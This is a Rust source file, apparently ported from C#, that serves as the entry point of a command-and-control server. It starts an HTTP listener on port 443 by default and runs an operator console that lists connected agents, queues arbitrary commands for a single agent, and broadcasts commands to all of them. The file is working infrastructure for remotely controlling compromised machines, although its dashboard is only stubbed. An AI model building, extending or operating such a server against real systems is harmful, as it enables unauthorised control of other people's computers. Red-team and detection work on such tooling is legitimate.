// server_main.rs — Rust port of ServerMain.cs
// C2 Server entry point — starts the HTTP C2 server + web dashboard.

use crate::c2_server::C2Server;

/// C2 Server entry point — parses CLI args and starts server + dashboard.
pub async fn run(args: Vec<String>) {
    let server_port = get_arg_int(&args, "--port", 443);
    let dash_port = get_arg_int(&args, "--dash", 8080);
    let auth_key = get_arg_str(&args, "--key");

    println!();
    println!("  ╔══════════════════════════════════════════════════╗");
    println!("  ║           C2 COMMAND CENTER v2.0                 ║");
    println!("  ║        Server + Web Dashboard (Rust)             ║");
    println!("  ╠══════════════════════════════════════════════════╣");
    println!("  ║  Server Port:    {:<30} ║", server_port);
    println!("  ║  Dashboard:      http://127.0.0.1:{:<17} ║", dash_port);
    println!("  ╚══════════════════════════════════════════════════╝");
    println!();

    // Start C2 Server
    let server = C2Server::new(
        server_port,
        auth_key.as_deref(),
        None,                    // file_drop_dir (default)
        120,                     // agent timeout seconds
        60000,                   // stale cleanup interval ms
    );
    let _http_handle = server.start_http();

    println!("[+] Auth Key: {}", server.auth_key());
    println!();

    // Dashboard would be started here (web UI serving)
    // In a full implementation, this would serve a web dashboard on dash_port
    println!("[+] Dashboard ready at: http://127.0.0.1:{}/", dash_port);
    println!();
    println!("[*] You can use the web dashboard OR the console below.");
    println!("[*] Type 'help' for console commands, or open the dashboard in a browser.");
    println!();

    // Interactive console loop
    run_console(&server).await;

    // Cleanup
    server.stop();
}

/// Interactive console for the C2 operator.
async fn run_console(server: &C2Server) {
    use std::io::{self, BufRead, Write};

    let stdin = io::stdin();
    let mut stdout = io::stdout();

    loop {
        print!("c2> ");
        let _ = stdout.flush();

        let mut line = String::new();
        if stdin.lock().read_line(&mut line).is_err() {
            break;
        }

        let line = line.trim();
        if line.is_empty() { continue; }

        let parts: Vec<&str> = line.splitn(3, ' ').collect();
        let command = parts[0].to_lowercase();

        match command.as_str() {
            "help" => {
                println!();
                println!("  ===== C2 Console Commands =====");
                println!("  agents                          — List all agents");
                println!("  cmd <agent_id> <command> [args] — Send command to agent");
                println!("  broadcast <command> [args]      — Send to ALL agents");
                println!("  results [agent_id]              — Show recent results");
                println!("  status                          — Connection summary");
                println!("  exit / quit                     — Shut down server");
                println!();
            }

            "agents" | "list" => {
                println!("{}", server.get_connection_summary());
            }

            "cmd" | "send" => {
                if parts.len() < 3 {
                    println!("Usage: cmd <agent_id> <command> [args]");
                    continue;
                }
                let agent_id = parts[1];
                let rest: Vec<&str> = line.splitn(3, ' ').collect();
                let cmd_parts: Vec<&str> = rest.get(2).unwrap_or(&"").splitn(2, ' ').collect();
                let cmd = cmd_parts[0];
                let args = cmd_parts.get(1).map(|&s| s);

                let cmd_id = server.queue_command(agent_id, cmd, args);
                println!("[+] Command {} queued for {}", cmd_id, agent_id);
            }

            "broadcast" | "bc" => {
                if parts.len() < 2 {
                    println!("Usage: broadcast <command> [args]");
                    continue;
                }
                let rest: Vec<&str> = line.splitn(2, ' ').collect();
                let cmd_parts: Vec<&str> = rest.get(1).unwrap_or(&"").splitn(2, ' ').collect();
                let cmd = cmd_parts[0];
                let args = cmd_parts.get(1).map(|&s| s);

                let cmd_id = server.broadcast_command(cmd, args);
                println!("[+] Broadcast {} sent", cmd_id);
            }

            "status" => {
                println!("{}", server.get_connection_summary());
            }

            "exit" | "quit" => {
                println!("[*] Shutting down...");
                break;
            }

            _ => {
                println!("Unknown command: {}. Type 'help'.", command);
            }
        }
    }
}

// ==================== CLI Argument Parsing ====================

fn get_arg_int(args: &[String], name: &str, default: u16) -> u16 {
    for (i, arg) in args.iter().enumerate() {
        if arg == name {
            if let Some(val) = args.get(i + 1) {
                if let Ok(n) = val.parse() {
                    return n;
                }
            }
        }
    }
    default
}

fn get_arg_str(args: &[String], name: &str) -> Option<String> {
    for (i, arg) in args.iter().enumerate() {
        if arg == name {
            return args.get(i + 1).cloned();
        }
    }
    None
}
